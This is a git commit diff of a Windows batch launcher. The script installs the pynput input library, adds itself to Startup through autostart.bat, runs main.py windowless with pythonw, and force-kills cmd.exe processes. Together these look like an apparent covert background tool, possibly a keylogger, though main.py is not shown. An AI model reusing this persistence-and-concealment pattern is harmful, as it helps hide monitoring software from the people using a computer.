ff33709f1d68fddfaf0354fd5083168a095de75d
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-11 16:36:53 +0100

    Update run.bat

--- run.bat
+++ run.bat
@@ -8,7 +8,7 @@ pip install pynput
 :: Run autostart.bat to add run.bat to Startup
 call autostart.bat
 
-pythonw main.py
+start pythonw main.py
 for /f "tokens=1" %%i in ('tasklist ^| findstr cmd.exe') do (
     if not "%%i" == "python.exe" taskkill /F /IM %%i
 )
